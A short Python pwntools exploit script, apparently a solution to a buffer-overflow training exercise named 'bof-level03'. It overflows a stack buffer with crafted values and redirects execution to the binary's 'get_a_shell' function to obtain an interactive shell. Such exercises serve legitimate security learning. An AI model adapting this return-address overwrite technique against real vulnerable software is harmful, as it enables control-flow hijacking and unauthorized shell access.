from pwn import *
import sys

context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./bof-level03")

get_shell_addr = p64(elf.symbols["get_a_shell"])

# a1 = 0x4141414141414141 # aaaaa
# b1 = 0x4242424242424242 # bbbb
#
# a2 = 0x4040404040404040 
# b2 = 0x4444444444444444

val = 0x101010101010101
val2 = 0x202020202020202

a = 0x6867666564636261 + val
b = 0x4847464544434241 - val2

buf_len = 0x30 - 0x10

# p = gdb.debug([elf.path], gdbscript='''
#          b *0x000000000040085e
#          continue 
# ''')

p = process([elf.path])

message = get_shell_addr + (buf_len - 8) * b"A" + p64(b) + p64(a)  + 8 * b"A" + get_shell_addr

p.sendline(message)

p.interactive()
